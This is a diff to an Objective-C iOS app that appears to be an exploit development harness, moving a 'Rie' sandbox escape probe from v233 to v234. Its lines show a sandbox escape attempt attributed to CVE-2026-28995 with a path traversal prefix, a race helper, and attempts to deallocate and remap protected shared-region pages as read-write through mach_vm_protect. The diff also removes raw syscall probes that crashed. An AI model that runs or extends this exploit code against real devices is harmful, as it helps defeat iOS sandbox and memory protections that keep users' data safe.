@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v233)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v234)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v233: fix crash + SR deallocate/re-map probe ===\n"];
+        [self appendLog:@"\n=== Rie v234: rm crashing probes, find RW pages, deallocate SR ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9704,24 +9704,7 @@ static uint64_t rie_find_exec_base(task_t task,
                     [self appendLog:@"  no writable SR pages found"];
                 }
 
-                // ── syscall 437/535 probes (skip 438 — caused crash in v232) ──
-                [self appendLog:@"\n── Other SR syscall probes ──"];
-                int testSCs[] = {437, 535};
-                const char *testSCnames[] = {"437", "535"};
-                for (int ti = 0; ti < 2; ti++) {
-                    int sn = testSCs[ti];
-                    errno = 0;
-                    long r = sc(sn, 0, NULL, 0, NULL);
-                    if (r == 0 && errno == 0) {
-                        [self appendLog:[NSString stringWithFormat:
-                            @"  syscall %d(0,NULL,0,NULL): ret=%ld errno=%d << EXISTS!",
-                            sn, r, errno]];
-                    } else {
-                        [self appendLog:[NSString stringWithFormat:
-                            @"  syscall %d(0,NULL,0,NULL): ret=%ld errno=%d",
-                            sn, r, errno]];
-                    }
-                }
+                // ── Skip syscall 437/535 probes — all crash like 438 in v232/v233 ──
             }
         }
 
@@ -9731,7 +9714,7 @@ static uint64_t rie_find_exec_base(task_t task,
             // Resolve mach_vm_deallocate and mach_vm_protect
             kern_return_t (*vm_dealloc)(vm_map_t, mach_vm_address_t, mach_vm_size_t) =
                 dlsym(RTLD_DEFAULT, "mach_vm_deallocate");
-            kern_return_t (*vm_prot)(vm_map_t, mach_vm_address_t, mach_vm_size_t, boolean_t, vm_prot_t) =
+            kern_return_t (*vm_protect_fn)(vm_map_t, mach_vm_address_t, mach_vm_size_t, boolean_t, vm_prot_t) =
                 dlsym(RTLD_DEFAULT, "mach_vm_protect");
             // Resolve vm_region for address validation
             Rie_VMRegionRecurseFn vrr5 = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
@@ -9751,9 +9734,9 @@ static uint64_t rie_find_exec_base(task_t task,
                     (unsigned long long)testAddr, krA, errno]];
 
                 // Test B: try to change protection (R→RW)
-                if (vm_prot) {
+                if (vm_protect_fn) {
                     errno = 0;
-                    kern_return_t krB = vm_prot(mach_task_self(), testAddr, testSize, FALSE,
+                    kern_return_t krB = vm_protect_fn(mach_task_self(), testAddr, testSize, FALSE,
                         VM_PROT_READ | VM_PROT_WRITE);
                     [self appendLog:[NSString stringWithFormat:
                         @"  B: protect RW @0x%llx → kr=%d errno=%d",
